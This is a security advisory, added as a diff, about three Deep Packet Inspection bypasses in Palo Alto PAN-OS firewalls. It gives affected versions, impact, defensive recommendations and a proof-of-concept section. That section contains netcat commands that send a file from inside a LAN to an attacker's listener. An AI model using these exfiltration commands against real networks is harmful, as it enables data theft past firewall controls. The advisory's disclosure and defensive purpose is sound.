@@ -1,0 +1,101 @@
+=============================================================================================================================================
+| # Title     : Palo Alto Deep Packet Inspection (DPI) Critical Vulnerabilities in Mechanism                                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.paloaltonetworks.com/network-security/pan-os                                                                    |
+=============================================================================================================================================
+
+POC :
+
+[+] Summary
+
+   3 vulnerabilities in Palo Alto Deep Packet Inspection mechanism  
+   Advisory URL: https://pierrekim.github.io/advisories/2025-palo-alto-dpi.txt  
+   Blog URL: https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html  
+
+[+] :: Product Description ::
+    ------------------------------------------------------------
+   Palo Alto’s Next-Generation Firewalls provide advanced packet inspection technologies including Deep Packet Inspection (DPI).  
+    They use App-ID technology to identify applications even when they attempt to evade detection through masquerading, port hopping, or encryption.
+
+   ------------------------------------------------------------
+[+] :: Vulnerability Summary ::
+   ------------------------------------------------------------
+   Vulnerable versions: **All Palo Alto firewall versions**.
+
+  Versions tested (November 2024):  
+  - PanOS 10.2.8 – vulnerable  
+  - PanOS 10.2.9-h1 – vulnerable  
+  - PanOS 11.1.4 – vulnerable  
+  - PanOS 11.2.0 – vulnerable  
+
+[+] Three main vulnerabilities:
+
+   1. **Exfiltration of data via TCP/80 using “service-http”**  
+   2. **Exfiltration of data via TCP/443 using “service-https”**  
+   3. **Exfiltration of data via UDP to any port and any IP**  
+   - Includes PoC: client.py and server.py
+
+
+[+] :: Impact ::
+------------------------------------------------------------
+  An attacker within the LAN can:  
+  - Bypass Deep Packet Inspection  
+  - Exfiltrate sensitive data to any external IP  
+  - Using HTTP, HTTPS, or UDP  
+  - Without any filtering or blocking  
+
+   This makes networks relying solely on DPI rules **highly vulnerable to data exfiltration attacks**.
+
+   ------------------------------------------------------------
+[+] :: Recommendations ::
+   ------------------------------------------------------------
+   - Do not use DPI rules without specifying destination IP ranges.  
+   - Always define IPv4/IPv6 ranges of allowed remote services.  
+   - Use Palo Alto EDL when possible.  
+   - Do not rely solely on App-ID to classify sensitive applications.  
+
+------------------------------------------------------------
+[+] :: PoC Summary ::
+------------------------------------------------------------
+
+**Server (attacker on WAN) – listening on port 80:**
+
+    for i in $(seq 1 10); do nc -l -v -p 80 > exfiltration-http-$i; sleep 1; done
+
+**Client (inside LAN) – sending random data:**
+
+    for i in $(seq 1 10); do nc -v <SERVER-IP> 80 < rand.hex; sleep 1.5; done
+
+**Verification:**
+
+    sha256sum exfiltration-http-*
+
+All received files match the original hash — confirming successful data exfiltration through the firewall.
+
+------------------------------------------------------------
+[+] :: Full Attack Execution (Working PoC) ::
+------------------------------------------------------------
+
+1. On the attacker/server side:
+
+    nc -l -v -p 80 > exfil-file
+
+2. On the victim/client side inside LAN:
+
+    nc -v <SERVER-IP> 80 < file-to-exfiltrate.bin
+
+3. The server receives the data despite DPI rules.
+
+------------------------------------------------------------
+[+] :: Conclusion ::
+------------------------------------------------------------
+The Deep Packet Inspection system in Palo Alto firewalls can be fully bypassed to leak data via HTTP/HTTPS/UDP without filtering.  
+Because the engine allows up to 256 KB before blocking, attackers can exfiltrate massive amounts of information.
+
+**All networks relying solely on App-ID or DPI without strict IP-based rules are at severe risk of data exfiltration.**
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
